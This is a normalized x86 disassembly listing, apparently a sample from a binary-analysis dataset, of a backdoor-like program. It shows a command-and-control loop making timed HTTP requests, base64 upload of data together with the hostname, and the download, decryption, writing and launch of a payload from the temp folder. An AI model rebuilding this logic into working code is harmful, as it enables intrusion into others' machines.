and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xff
mov ecx [ ebp - 0x20 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x24 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x18 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x8 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp - 0x1c ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x24 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0xc ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
sub edx 0x10
mov [ ebp - 0x4 ] edx
sub_404130
push ebp
mov ebp esp
sub esp 0x1d0
push edi
mov [ ebp - 0x84 ] 0x1
mov [ ebp - 0x184 ] 0x0
mov ecx 0x3f
xor eax eax
lea edi [ ebp - 0x183 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x80 ] 0x0
mov ecx 0xf
xor eax eax
lea edi [ ebp - 0x7f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x40 ] 0x0
mov ecx 0xf
xor eax eax
lea edi [ ebp - 0x3f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x6
push 0x0
push rw-data
call sub_405cd0
add esp 0xc
push rw-data
push rw-data
call sub_405950
add esp 0x8
push 0x0
call sub_405bea
add esp 0x4
push eax
call sub_405bbb
add esp 0x4
call sub_404ec5
xor eax eax
pop edi
mov esp ebp
pop ebp
retn 0x10
push 0x100
push 0x0
lea eax [ ebp - 0x184 ]
push eax
call sub_405cd0
add esp 0xc
push 0x40
push 0x0
lea ecx [ ebp - 0x80 ]
push ecx
call sub_405cd0
add esp 0xc
push 0x40
push 0x0
lea edx [ ebp - 0x40 ]
push edx
call sub_405cd0
add esp 0xc
push 0x6
push 0x0
push rw-data
call sub_405cd0
add esp 0xc
lea eax [ ebp - 0x184 ]
push eax
push rw-data
push rw-data
call sub_404440
add esp 0xc
lea ecx [ ebp - 0x80 ]
push ecx
lea edx [ ebp - 0x184 ]
push edx
call sub_4048c5
add esp 0x8
lea eax [ ebp - 0x80 ]
push eax
call sub_405b40
add esp 0x4
cmp eax 0x7
jae r-xdata
push 0x6
lea ecx [ ebp - 0x80 ]
push ecx
push rw-data
call sub_405a40
add esp 0xc
mov [ rw-data ] 0x0
push 0x6
push 0x0
push rw-data
call sub_405cd0
add esp 0xc
push rw-data
push rw-data
call sub_405950
add esp 0x8
mov [ ebp - 0x188 ] 0x0
jmp r-xdata
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
cmp [ ebp - 0x188 ] 0x40
jae r-xdata
cmp [ ebp - 0x84 ] 0x0
je r-xdata
movsx edx [ ebp - 0x7a ]
mov [ ebp - 0x1d0 ] edx
mov eax [ ebp - 0x1d0 ]
sub eax 0x44
mov [ ebp - 0x1d0 ] eax
cmp [ ebp - 0x1d0 ] 0x2f
ja r-xdata
mov eax [ ebp - 0x188 ]
movsx ecx [ ebp + eax - 0x80 ]
test ecx ecx
je r-xdata
push 0x36ee80
call [ Sleep@IAT ]
mov edx [ ebp - 0x1d0 ]
xor ecx ecx
mov cl [ edx + lookup_table_404410 ]
jmp [ ecx * 4 + jump_table_404400 ]
mov edx [ ebp - 0x188 ]
mov eax [ ebp - 0x188 ]
mov cl [ ebp + eax - 0x78 ]
mov [ ebp + edx - 0x40 ] cl
jmp r-xdata
mov [ ebp - 0x1c8 ] 0x0
mov ecx 0xf
xor eax eax
lea edi [ ebp - 0x1c7 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push rw-data
lea eax [ ebp - 0x1c8 ]
push eax
call sub_405950
add esp 0x8
lea ecx [ ebp - 0x40 ]
push ecx
lea edx [ ebp - 0x1c8 ]
push edx
call sub_405960
add esp 0x8
lea eax [ ebp - 0x40 ]
push eax
call sub_405942
add esp 0x4
mov [ ebp - 0x1cc ] eax
mov ecx [ ebp - 0x1cc ]
imul ecx ecx 0x3c
imul ecx ecx 0x3e8
push ecx
call [ Sleep@IAT ]
jmp r-xdata
lea edx [ ebp - 0x40 ]
push edx
call sub_40498a
add esp 0x4
test eax eax
je r-xdata
push rw-data
lea eax [ ebp - 0x40 ]
push eax
call sub_40be20
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp - 0x188 ]
add edx 0x1
mov [ ebp - 0x188 ] edx
jmp r-xdata
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
call sub_4051ab
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
mov [ ebp - 0x84 ] 0x0
jmp r-xdata
push 0x927c0
call [ Sleep@IAT ]
jmp r-xdata
sub_404440
push ebp
mov ebp esp
sub esp 0x58
push edi
push 0xa
push rw-data
call sub_405019
add esp 0x8
mov [ ebp - 0x54 ] 0x0
mov ecx 0xf
xor eax eax
lea edi [ ebp - 0x53 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push rw-data
lea eax [ ebp - 0x54 ]
push eax
call sub_405950
add esp 0x8
push rw-data
lea ecx [ ebp - 0x54 ]
push ecx
call sub_405960
add esp 0x8
push 0x200
push 0x0
push rw-data
call sub_405cd0
add esp 0xc
push 0x200
push 0x0
push rw-data
call sub_405cd0
add esp 0xc
call sub_4050a7
push rw-data
push rw-data
call sub_405960
add esp 0x8
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
call [ InternetOpenA@IAT ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push __dos_header
push 0x3
push rw-data
push rw-data
push 0x0
push rw-data
mov edx [ ebp - 0x14 ]
push edx
call [ InternetConnectA@IAT ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push rw-data
call sub_405d28
add esp 0x4
xor eax eax
jmp r-xdata
push 0x0
push 0x4400000
push 0x0
push 0x0
push rw-data
lea ecx [ ebp - 0x54 ]
push ecx
push rw-data
mov edx [ ebp - 0x10 ]
push edx
call [ HttpOpenRequestA@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call [ InternetCloseHandle@IAT ]
push rw-data
call sub_405d28
add esp 0x4
pop edi
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x8 ]
push edx
call [ HttpSendRequestA@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0x14 ]
push ecx
call [ InternetCloseHandle@IAT ]
push rw-data
call sub_405d28
add esp 0x4
lea eax [ ebp - 0x58 ]
push eax
push 0x80
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
call [ InternetReadFile@IAT ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0x10 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0x14 ]
push edx
call [ InternetCloseHandle@IAT ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0x10 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0x14 ]
push edx
call [ InternetCloseHandle@IAT ]
push rw-data
call sub_405d28
add esp 0x4
mov eax 0x1
push rw-data
call sub_405d28
add esp 0x4
sub_404626
push ebp
mov ebp esp
mov eax 0x19094
call sub_405d70
push esi
push edi
mov ecx 0x10
mov esi rw-data
lea edi [ ebp - 0x48 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov [ ebp - 0x4 ] 0x41
push 0xa
push rw-data
call sub_405019
add esp 0x8
mov [ ebp - 0x8c ] 0x0
mov ecx 0xf
xor eax eax
lea edi [ ebp - 0x8b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push rw-data
lea eax [ ebp - 0x8c ]
push eax
call sub_405950
add esp 0x8
push rw-data
lea ecx [ ebp - 0x8c ]
push ecx
call sub_405960
add esp 0x8
push rw-data
lea edx [ ebp - 0x8c ]
push edx
call sub_405960
add esp 0x8
push rw-data
lea eax [ ebp - 0x8c ]
push eax
call sub_405960
add esp 0x8
push rw-data
push rw-data
call sub_405950
add esp 0x8
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
call [ InternetOpenA@IAT ]
mov [ ebp - 0x94 ] eax
cmp [ ebp - 0x94 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x3
push rw-data
push rw-data
push 0x50
push rw-data
mov ecx [ ebp - 0x94 ]
push ecx
call [ InternetConnectA@IAT ]
mov [ ebp - 0x90 ] eax
cmp [ ebp - 0x90 ] 0x0
jne r-xdata
push rw-data
call sub_405d28
add esp 0x4
xor eax eax
jmp r-xdata
push 0x0
push 0x80000000
push 0x0
push 0x0
push rw-data
lea eax [ ebp - 0x8c ]
push eax
push rw-data
mov ecx [ ebp - 0x90 ]
push ecx
call [ HttpOpenRequestA@IAT ]
mov [ ebp - 0x4c ] eax
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
mov edx [ ebp - 0x94 ]
push edx
call [ InternetCloseHandle@IAT ]
push rw-data
call sub_405d28
add esp 0x4
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0xa0000000
lea ecx [ ebp - 0x48 ]
push ecx
call sub_405b40
add esp 0x4
push eax
lea edx [ ebp - 0x48 ]
push edx
mov eax [ ebp - 0x4c ]
push eax
call [ HttpAddRequestHeadersA@IAT ]
cmp eax 0x1
jne r-xdata
mov edx [ ebp - 0x90 ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x94 ]
push eax
call [ InternetCloseHandle@IAT ]
push rw-data
call sub_405d28
add esp 0x4
mov edx [ ebp - 0x4c ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0x90 ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0x94 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov eax 0x1
push 0x19000
push 0x0
lea ecx [ ebp - 0x19094 ]
push ecx
call sub_405cd0
add esp 0xc
mov edx [ ebp + 0x8 ]
push edx
call sub_405b40
add esp 0x4
push eax
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x19094 ]
push ecx
call sub_405230
add esp 0xc
lea edx [ ebp - 0x19094 ]
push edx
call sub_405b40
add esp 0x4
push eax
lea eax [ ebp - 0x19094 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4c ]
push ecx
call [ HttpSendRequestA@IAT ]
sub_404861
push ebp
mov ebp esp
sub esp 0x8
push rw-data
mov eax [ ebp + 0x8 ]
push eax
call sub_405da0
add esp 0x8
mov [ ebp - 0x4 ] eax
push rw-data
mov ecx [ ebp + 0x8 ]
push ecx
call sub_405da0
add esp 0x8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0x4 ]
sub edx 0x4
push edx
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_405a40
add esp 0xc
mov eax 0x1
sub_4048c5
push ebp
mov ebp esp
sub esp 0x8c
push edi
mov ax [ rw-data ]
mov [ ebp - 0x80 ] ax
mov ecx 0x1f
xor eax eax
lea edi [ ebp - 0x7e ]
[ edi ]
stosw [ edi ]
push rw-data
mov ecx [ ebp + 0x8 ]
push ecx
call sub_405da0
add esp 0x8
mov [ ebp - 0x84 ] eax
push rw-data
mov edx [ ebp + 0x8 ]
push edx
call sub_405da0
add esp 0x8
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x84 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8c ] 0x0
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8c ]
sub eax [ ebp - 0x84 ]
sub eax 0x4
push eax
mov ecx [ ebp - 0x84 ]
add ecx 0x4
push ecx
lea edx [ ebp - 0x80 ]
push edx
call sub_405a40
add esp 0xc
lea eax [ ebp - 0x80 ]
push eax
call sub_405b40
add esp 0x4
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0x80 ]
push ecx
call sub_405b40
add esp 0x4
push eax
lea edx [ ebp - 0x80 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_4054f0
add esp 0xc
mov eax 0x1
sub_40498a
push ebp
mov ebp esp
sub esp 0xfc
push edi
mov [ ebp - 0xbc ] 0x0
mov [ ebp - 0xb8 ] 0x0
mov ecx 0xf
xor eax eax
lea edi [ ebp - 0xb7 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov [ ebp - 0x60 ] 0x0
mov ecx 0xf
xor eax eax
lea edi [ ebp - 0x5f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0xb8 ]
push ecx
push rw-data
mov edx [ ebp + 0x8 ]
push edx
call sub_4061a5
add esp 0x10
cmp eax 0x2
je r-xdata
mov eax 0x1
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
call [ InternetOpenA@IAT ]
mov [ ebp - 0xd4 ] eax
cmp [ ebp - 0xd4 ] 0x0
jne r-xdata
push 0x0
push __dos_header
push 0x3
push rw-data
push rw-data
push 0x0
lea ecx [ ebp - 0xb8 ]
push ecx
mov edx [ ebp - 0xd4 ]
push edx
call [ InternetConnectA@IAT ]
mov [ ebp - 0xd0 ] eax
cmp [ ebp - 0xd0 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
push 0x4000000
push rw-data
push 0x0
push rw-data
lea ecx [ ebp - 0x60 ]
push ecx
push rw-data
mov edx [ ebp - 0xd0 ]
push edx
call [ HttpOpenRequestA@IAT ]
mov [ ebp - 0xcc ] eax
cmp [ ebp - 0xcc ] 0x0
jne r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call [ InternetCloseHandle@IAT ]
xor eax eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0xcc ]
push edx
call [ HttpSendRequestA@IAT ]
mov [ ebp - 0xc8 ] eax
cmp [ ebp - 0xc8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0xd0 ]
push ecx
call [ InternetCloseHandle@IAT ]
xor eax eax
jmp r-xdata
mov [ ebp - 0x68 ] 0x10
push 0x0
lea eax [ ebp - 0x68 ]
push eax
lea ecx [ ebp - 0x78 ]
push ecx
push 0x13
mov edx [ ebp - 0xcc ]
push edx
call [ HttpQueryInfoA@IAT ]
mov [ ebp - 0x64 ] eax
lea eax [ ebp - 0x78 ]
push eax
call sub_405942
add esp 0x4
cmp eax 0x194
jne r-xdata
mov eax [ ebp - 0xcc ]
push eax
call [ InternetCloseHandle@IAT ]
mov ecx [ ebp - 0xd0 ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0xd4 ]
push edx
call [ InternetCloseHandle@IAT ]
xor eax eax
jmp r-xdata
mov [ ebp - 0x68 ] 0x20
push 0x0
lea ecx [ ebp - 0x68 ]
push ecx
lea edx [ ebp - 0x20 ]
push edx
push 0x5
mov eax [ ebp - 0xcc ]
push eax
call [ HttpQueryInfoA@IAT ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x20 ]
push ecx
call sub_4058b7
add esp 0x4
mov [ ebp - 0xc0 ] eax
mov edx [ ebp - 0xc0 ]
add edx 0x1
push edx
call sub_406197
add esp 0x4
mov [ ebp - 0xf0 ] eax
mov eax [ ebp - 0xf0 ]
mov [ ebp - 0xc4 ] eax
lea ecx [ ebp - 0xbc ]
push ecx
mov edx [ ebp - 0xc0 ]
push edx
mov eax [ ebp - 0xc4 ]
push eax
mov ecx [ ebp - 0xcc ]
push ecx
call [ InternetReadFile@IAT ]
cmp [ ebp - 0xbc ] 0x0
je r-xdata
mov ecx [ ebp - 0xcc ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0xd0 ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0xd4 ]
push eax
call [ InternetCloseHandle@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xcc ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0xd0 ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0xd4 ]
push eax
call [ InternetCloseHandle@IAT ]
xor eax eax
jmp r-xdata
mov edx [ ebp - 0xbc ]
mov [ rw-data ] edx
push 0xff
push 0x0
push rw-data
call sub_405cd0
add esp 0xc
push rw-data
push 0xff
call [ GetTempPathA@IAT ]
push 0xff
push rw-data
push rw-data
call [ GetLongPathNameA@IAT ]
push 0x2f
lea eax [ ebp - 0x60 ]
push eax
call sub_406170
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x60 ]
push edx
push rw-data
call sub_405960
add esp 0x8
push 0x2f
lea ecx [ ebp - 0x60 ]
push ecx
call sub_406170
add esp 0x8
add eax 0x1
push eax
push rw-data
call sub_405960
add esp 0x8
jmp r-xdata
push rw-data
push rw-data
call sub_405960
add esp 0x8
push 0x0
push 0x2
push 0x4
push 0x0
push 0x1
push 0x40000000
push rw-data
call [ CreateFileA@IAT ]
mov [ ebp - 0xdc ] eax
cmp [ ebp - 0xdc ] 0x0
je r-xdata
push 0x2e
push rw-data
call sub_406170
add esp 0x8
mov [ eax ] 0x0
push 0x2e
push rw-data
call sub_406170
add esp 0x8
test eax eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
sub eax 0x1e
push eax
call sub_406197
add esp 0x4
mov [ ebp - 0xf4 ] eax
mov ecx [ ebp - 0xf4 ]
mov [ ebp - 0xe0 ] ecx
mov edx [ rw-data ]
sub edx 0x1e
push edx
call sub_406197
add esp 0x4
mov [ ebp - 0xf8 ] eax
mov eax [ ebp - 0xf8 ]
mov [ ebp - 0xec ] eax
mov ecx [ rw-data ]
sub ecx 0x1e
push ecx
push 0x0
mov edx [ ebp - 0xe0 ]
push edx
call sub_405cd0
add esp 0xc
mov eax [ rw-data ]
sub eax 0x1e
push eax
push 0x0
mov ecx [ ebp - 0xec ]
push ecx
call sub_405cd0
add esp 0xc
mov [ ebp - 0xe8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xcc ]
push ecx
call [ InternetCloseHandle@IAT ]
mov edx [ ebp - 0xd0 ]
push edx
call [ InternetCloseHandle@IAT ]
mov eax [ ebp - 0xd4 ]
push eax
call [ InternetCloseHandle@IAT ]
push 0x3e8
call [ Sleep@IAT ]
mov eax 0x1
mov eax [ ebp - 0xe8 ]
cmp eax [ rw-data ]
jge r-xdata
mov ecx [ ebp - 0xec ]
push ecx
mov edx [ ebp - 0xe0 ]
push edx
call sub_4050ec
add esp 0x8
push 0x0
lea eax [ ebp - 0xd8 ]
push eax
mov ecx [ rw-data ]
sub ecx 0x1e
push ecx
mov edx [ ebp - 0xec ]
push edx
mov eax [ ebp - 0xdc ]
push eax
call [ WriteFile@IAT ]
mov ecx [ ebp - 0xdc ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ ebp - 0xc4 ]
mov [ ebp - 0xfc ] edx
mov eax [ ebp - 0xfc ]
push eax
call sub_405e20
add esp 0x4
mov [ ebp - 0xe4 ] 0x0
mov ecx [ ebp - 0xc4 ]
add ecx [ ebp - 0xe8 ]
mov [ ebp - 0xe4 ] ecx
cmp [ ebp - 0xe8 ] 0x12
jl r-xdata
jmp r-xdata
mov edx [ rw-data ]
sub edx 0xc
cmp [ ebp - 0xe8 ] edx
jge r-xdata
mov edx [ ebp - 0xe8 ]
add edx 0x1
mov [ ebp - 0xe8 ] edx
push 0x1
mov eax [ ebp - 0xe4 ]
push eax
mov ecx [ ebp - 0xe8 ]
mov edx [ ebp - 0xe0 ]
lea eax [ edx + ecx - 0x12 ]
push eax
call sub_405e30
add esp 0xc
sub_404ec5
push ebp
mov ebp esp
sub esp 0x63c
push 0x104
lea eax [ ebp - 0x200 ]
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push 0x104
lea ecx [ ebp - 0x200 ]
push ecx
lea edx [ ebp - 0x200 ]
push edx
call [ GetShortPathNameA@IAT ]
push 0x104
lea eax [ ebp - 0x600 ]
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
push rw-data
lea ecx [ ebp - 0x400 ]
push ecx
call [ lstrcpyA@IAT ]
lea edx [ ebp - 0x200 ]
push edx
lea eax [ ebp - 0x400 ]
push eax
call [ lstrcatA@IAT ]
push rw-data
lea ecx [ ebp - 0x400 ]
push ecx
call [ lstrcatA@IAT ]
mov [ ebp - 0x63c ] 0x3c
mov [ ebp - 0x638 ] 0x40
mov [ ebp - 0x634 ] 0x0
mov [ ebp - 0x630 ] rw-data
lea edx [ ebp - 0x600 ]
mov [ ebp - 0x62c ] edx
lea eax [ ebp - 0x400 ]
mov [ ebp - 0x628 ] eax
mov [ ebp - 0x624 ] 0x0
mov [ ebp - 0x620 ] 0x0
push 0x100
call [ GetCurrentProcess@IAT ]
push eax
call [ SetPriorityClass@IAT ]
push 0xf
call [ GetCurrentThread@IAT ]
push eax
call [ SetThreadPriority@IAT ]
lea ecx [ ebp - 0x63c ]
push ecx
call [ ShellExecuteExA@IAT ]
test eax eax
je r-xdata
push 0x20
call [ GetCurrentProcess@IAT ]
push eax
call [ SetPriorityClass@IAT ]
push 0x0
call [ GetCurrentThread@IAT ]
push eax
call [ SetThreadPriority@IAT ]
xor eax eax
push 0x40
mov edx [ ebp - 0x604 ]
push edx
call [ SetPriorityClass@IAT ]
push 0x1
mov eax [ ebp - 0x604 ]
push eax
call [ SetProcessPriorityBoost@IAT ]
mov eax 0x1
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_405019
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
call sub_405bc8
cdq
mov ecx 0x1a
idiv ecx
add edx 0x41
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
mov [ eax ] dl
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_40506a
push ebp
mov ebp esp
push ecx
call sub_405bc8
cdq
mov ecx 0x9
idiv ecx
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x4 ] 0x7
jge r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x3e8
imul eax eax 0x3c
imul eax eax 0x3c
push eax
call [ Sleep@IAT ]
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
add edx 0x6
mov [ ebp - 0x4 ] edx
sub_4050a7
push ebp
mov ebp esp
sub esp 0x194
mov [ ebp - 0x194 ] 0x202
lea eax [ ebp - 0x190 ]
push eax
mov cx [ ebp - 0x194 ]
push ecx
call [ WSAStartup@IAT ]
test eax eax
jne r-xdata
call [ WSACleanup@IAT ]
mov esp ebp
pop ebp
retn
push 0x80
push rw-data
call [ gethostname@IAT ]
sub_4050ec
push ebp
mov ebp esp
sub esp 0x224
lea ecx [ ebp - 0x224 ]
call sub_405880
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov ecx [ rw-data ]
mov [ ebp - 0x18 ] ecx
mov edx [ rw-data ]
mov [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov cl [ rw-data ]
mov [ ebp - 0xc ] cl
mov [ ebp - 0x4 ] 0x0
push 0x80
lea edx [ ebp - 0x1c ]
push edx
lea ecx [ ebp - 0x224 ]
call sub_40155b
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
sub ecx 0x10
cmp [ ebp - 0x8 ] ecx
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ rw-data ]
jge r-xdata
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x224 ]
call sub_402e58
jmp r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x8 ]
mov cl [ eax ]
mov [ edx ] cl
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x10
mov [ ebp - 0x8 ] eax
sub_4051ab
push ebp
mov ebp esp
sub esp 0x5c
push 0x44
push 0x0
lea eax [ ebp - 0x5c ]
push eax
call sub_405cd0
add esp 0xc
mov [ ebp - 0x5c ] 0x44
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x30 ] 0x1
push 0x3e8
call [ Sleep@IAT ]
push rw-data
call [ LoadLibraryA@IAT ]
mov [ ebp - 0x18 ] eax
push rw-data
mov ecx [ ebp - 0x18 ]
push ecx
call [ GetProcAddress@IAT ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x10 ]
push edx
lea eax [ ebp - 0x5c ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
call [ ebp - 0x14 ]
mov esp ebp
pop ebp
retn
sub_405230
push ebp
mov ebp esp
sub esp 0x34
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
call sub_405b40
add esp 0x4
mov [ ebp + 0x10 ] eax
mov ecx [ ebp + 0x10 ]
sub ecx 0x3
cmp [ ebp - 0x8 ] ecx
jge r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp + 0x10 ]
jge r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x1c ]
and ecx 0xff
shr ecx 0x2
and ecx 0x3f
push ecx
call sub_4054b0
add esp 0x4
movsx edx al
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x1c ]
and eax 0xff
shl eax 0x6
shr eax 0x2
mov ecx [ ebp - 0x1c ]
shr ecx 0x8
and ecx 0xff
shr ecx 0x4
or eax ecx
and eax 0x3f
push eax
call sub_4054b0
add esp 0x4
movsx edx al
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x1c ]
shr eax 0x8
and eax 0xff
shl eax 0x4
shr eax 0x2
mov ecx [ ebp - 0x1c ]
shr ecx 0x10
and ecx 0xff
shr ecx 0x6
or eax ecx
and eax 0x3f
push eax
call sub_4054b0
add esp 0x4
movsx edx al
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x1c ]
shr eax 0x10
and eax 0xff
shl eax 0x2
shr eax 0x2
and eax 0x3f
push eax
call sub_4054b0
add esp 0x4
movsx ecx al
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x24 ]
shl edx 0x8
mov eax [ ebp - 0x20 ]
or eax edx
mov ecx [ ebp - 0x14 ]
shl ecx 0x10
or eax ecx
mov edx [ ebp - 0x18 ]
shl edx 0x18
or eax edx
mov ecx [ ebp - 0x4 ]
mov [ ecx ] eax
mov edx [ ebp - 0xc ]
add edx 0x4
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
add ecx 0x3
mov [ ebp - 0x10 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x3
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x2c ]
cmp edx [ ebp - 0x28 ]
jge r-xdata
mov ecx [ ebp - 0x30 ]
